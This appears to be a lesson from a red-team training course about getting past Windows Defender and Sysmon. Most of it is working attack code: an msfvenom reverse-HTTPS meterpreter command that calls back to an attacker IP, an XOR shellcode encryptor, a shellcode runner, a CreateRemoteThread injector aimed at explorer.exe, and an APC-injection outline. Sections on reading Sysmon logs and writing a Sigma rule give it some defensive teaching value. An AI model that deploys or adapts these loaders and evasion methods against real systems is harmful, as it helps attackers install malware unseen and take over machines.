---
title: "Evasion Lab — Bypass Defender and Sysmon with a Custom Payload"
tags: [red-team, evasion, lab, Defender, Sysmon, AMSI, shellcode, process-injection,
  custom-payload]
module: 08-RedTeam-01
day: 495
related_topics:
  - AV and EDR Evasion Concepts (Day 494)
  - Payload Development (Day 496)
  - Endpoint Detection — EDR and Sysmon (Day 404 concept)
---

# Day 495 — Evasion Lab: Bypass Defender + Sysmon with a Custom Payload

> "Evasion without a feedback loop is guessing. You need to know what
> the EDR is seeing. You need logs. You need Sysmon running. You need
> to watch your own attack from the defender's seat.
> That is how you build reliable evasion — not by luck."
>
> — Ghost

---

## Goals

Set up a lab with Windows Defender + Sysmon active and logging.
Build a custom shellcode runner that bypasses static detection.
Apply process injection to hide the payload in a legitimate process.
Observe Sysmon logs before and after evasion — understand what changed.

**Prerequisites:** Day 494 (evasion concepts), Day 493 (C2 lab), C programming,
Windows fundamentals.
**Time budget:** 6–8 hours.

---

## Part 1 — Lab Setup

### Windows Victim VM

```
OS: Windows 10 22H2 or Windows 11
Defender: enabled (default settings, real-time protection on)
Sysmon: installed with Sysinternals Sysmon64.exe -i sysmon_config.xml
  Config: https://github.com/SwiftOnSecurity/sysmon-config (recommended)

Logging:
  Sysmon events → Event Viewer → Applications and Services → Microsoft → Windows → Sysmon
  PowerShell logging: enabled (Module + Script Block logging)
    HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1
```

### Attacker VM

```
OS: Kali Linux or Ubuntu
Tools: gcc-mingw-w64 (cross-compile for Windows), msfvenom (for shellcode),
       Sliver (C2 from Day 493)
```

---

## Part 2 — Baseline: What Gets Caught

Before building evasion, understand what fails.

### Test 1: msfvenom Raw Shellcode — Fails Immediately

```bash
# Generate a standard msfvenom payload:
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.100.10 LPORT=443 \
    -f c > shellcode_raw.c

# Compile a naïve runner and copy to Windows VM:
# Result: Defender quarantines it before execution
# Sysmon Event 25: Process Create — Defender quarantine action
```

### Test 2: Standard Sliver Implant — May Fail

```bash
# From Day 493 — generate a standard Sliver HTTPS beacon
# Result: varies by Defender version — may be caught on write to disk
```

**Goal of this lab:** understand what specific checks fire and bypass them.

---

## Part 3 — Step 1: Bypass Static Detection (Encrypt Shellcode)

The simplest static bypass: XOR-encrypt the shellcode; decrypt at runtime.
Defender scans bytes on disk. Encrypted shellcode does not match signatures.

```c
// encrypt.c — run once, on attacker machine
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    // Paste raw shellcode bytes here (from msfvenom -f raw | xxd -i)
    unsigned char shellcode[] = {
        /* shellcode bytes */
        0x90, 0x90, /* ... */
    };
    size_t len = sizeof(shellcode);
    unsigned char key = 0x5A;

    printf("unsigned char enc_shellcode[] = {");
    for (size_t i = 0; i < len; i++) {
        printf("0x%02x", shellcode[i] ^ key);
        if (i < len - 1) printf(",");
    }
    printf("};\n");
    printf("size_t shellcode_len = %zu;\n", len);
    return 0;
}
```

```c
// runner.c — the payload carrier, compiled for Windows
#include <windows.h>
#include <stdio.h>

// Paste encrypted shellcode output from encrypt.c:
unsigned char enc_shellcode[] = { /* ... encrypted bytes ... */ };
unsigned char XOR_KEY = 0x5A;

void decrypt(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) buf[i] ^= key;
}

int main(void) {
    size_t len = sizeof(enc_shellcode);
    decrypt(enc_shellcode, len, XOR_KEY);

    // Allocate RW memory, copy shellcode, change to RX, execute
    LPVOID mem = VirtualAlloc(NULL, len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, enc_shellcode, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    // Execute in a new thread
    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

```bash
# Cross-compile on Kali:
x86_64-w64-mingw32-gcc -o runner.exe runner.c -lws2_32
```

**Test:** Copy to Windows VM. Does Defender catch it on write? On execution?
Check Sysmon for Event ID 1 (Process Create), Event ID 10 (Process Access).

---

## Part 4 — Step 2: Process Injection to Trusted Process

If the runner.exe process making the C2 connection is suspicious, inject into
a legitimate process instead.

```c
// inject.c — inject into a running process (e.g., explorer.exe)
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD find_pid(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(pe32);
    if (Process32First(snap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, proc_name) == 0) {
                CloseHandle(snap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snap, &pe32));
    }
    CloseHandle(snap);
    return 0;
}

int main(void) {
    unsigned char enc_shellcode[] = { /* encrypted bytes */ };
    size_t sc_len = sizeof(enc_shellcode);

    // Decrypt
    for (size_t i = 0; i < sc_len; i++) enc_shellcode[i] ^= 0x5A;

    DWORD pid = find_pid("explorer.exe");
    if (!pid) { puts("target not found"); return 1; }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID rem = VirtualAllocEx(hProc, NULL, sc_len,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, rem, enc_shellcode, sc_len, NULL);
    CreateRemoteThread(hProc, NULL, 0,
                       (LPTHREAD_START_ROUTINE)rem, NULL, 0, NULL);
    CloseHandle(hProc);
    return 0;
}
```

**Test:** Check Sysmon Event ID 10 (ProcessAccess: SourceImage=inject.exe,
TargetImage=explorer.exe). This is the detection signal.

---

## Part 5 — Step 3: Reduce Sysmon Events — Less-Noisy Injection

Classic injection fires Sysmon Event 10 (ProcessAccess with PROCESS_VM_WRITE
and CREATE_THREAD access flags). Use an APC-based injection to reduce this.

```c
// apc_inject.c — QueueUserAPC injection (lower Sysmon noise)
// 1. Find an alertable thread in the target process
// 2. VirtualAllocEx + WriteProcessMemory (still fires Event 10)
// 3. QueueUserAPC to that thread (no CreateRemoteThread → no Event 8)
// 4. The APC runs when the thread enters an alertable wait state

// Key difference from classic injection:
// No CreateRemoteThread → Sysmon Event 8 (CreateRemoteThread) does NOT fire
// Process Access Event 10 STILL fires — you still need VirtualAllocEx

HANDLE hThread = /* find alertable thread in target */;
QueueUserAPC((PAPCFUNC)remote_addr, hThread, 0);
```

**Observation:** Compare Sysmon logs between classic injection and APC injection.
What events are present in both? What events are present only in classic?

---

## Part 6 — Sysmon Log Analysis

After each test, review the logs:

```powershell
# PowerShell — query Sysmon events
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' |
    Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-10) } |
    Select-Object TimeCreated, Id, Message |
    Format-List

# Key event IDs to watch:
# 1  — Process Created (new process, command line, parent)
# 3  — Network Connection (process, dest IP, port)
# 8  — CreateRemoteThread (source process, target process)
# 10 — ProcessAccess (source, target, access flags)
# 11 — FileCreate (files written to disk)
# 22 — DNSEvent (DNS query from process)
```

```
Expected events for a successful evasion:
  Event 1: runner.exe or inject.exe starts (unavoidable)
  Event 11: encrypted shellcode dropped to disk (if using file-based approach)
  Event 3: explorer.exe connects to 192.168.100.20:443 (C2 — injected)
  
Events to eliminate:
  Event 8: CreateRemoteThread from inject.exe → explorer.exe
  Event 10: ProcessAccess with suspicious access masks
```

---

## Part 7 — Checklist: Evasion Quality Assessment

After completing the lab, assess each stage:

| Stage | Detection signal | Bypassed? | How? |
|---|---|---|---|
| File written to disk | Defender static scan | | XOR encryption |
| Process created | Sysmon Event 1 | Unavoidable | Choose a benign name |
| Memory allocated | Sysmon Event 10 (allocate) | | Use module stomping |
| Shellcode written | Sysmon Event 10 (write) | | Use reflective loading |
| Thread created | Sysmon Event 8 | | Use APC, not CRT |
| Network connection | Sysmon Event 3 | | Inject into browser/explorer |
| DNS query | Sysmon Event 22 | | Ensure it matches profile |

---

## Key Takeaways

1. Evasion is measured by what appears in the logs, not by whether an alert
   fired. Study the Sysmon events after every technique.
2. Encrypting shellcode defeats static detection. It does not help against
   behavioural detection — the decrypted shellcode still runs the same way.
3. Process injection changes the "parent" process of C2 traffic from a suspicious
   binary to a trusted one. But injection always generates Sysmon Event 10
   (ProcessAccess). That event is the invariant you cannot avoid with classic
   injection.
4. APC injection removes Sysmon Event 8 (CreateRemoteThread). Event 10 still
   fires. The fewer suspicious events, the lower the alert risk.
5. Test against the specific EDR version in the target environment. What bypasses
   Defender 2024 may not bypass CrowdStrike Falcon or SentinelOne.

---

## Exercises

1. Build and test the XOR-encrypted runner. Record which Sysmon events fire.
   Modify it to decrypt the shellcode in two stages (XOR then ROL) and repeat.
   Do Defender's alerts change?
2. Implement APC injection. Compare the Sysmon event log to classic CRT injection.
   List every event that is present in classic but absent in APC.
3. Write a Sigma rule that detects the classic injection sequence (Event 10
   with VirtualAllocEx + WriteProcessMemory access flags from a non-system
   process targeting explorer.exe).
4. Research "module stomping" (overwriting a loaded DLL's RX section). Implement
   a proof of concept. Does Sysmon Event 10 still fire? What is the new
   detection signal?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q495.1, Q495.2 …).

---

## Navigation

← Previous: [Day 494 — AV and EDR Evasion Concepts](DAY-0494-AV-and-EDR-Evasion-Concepts.md)
→ Next: [Day 496 — Payload Development](DAY-0496-Payload-Development.md)
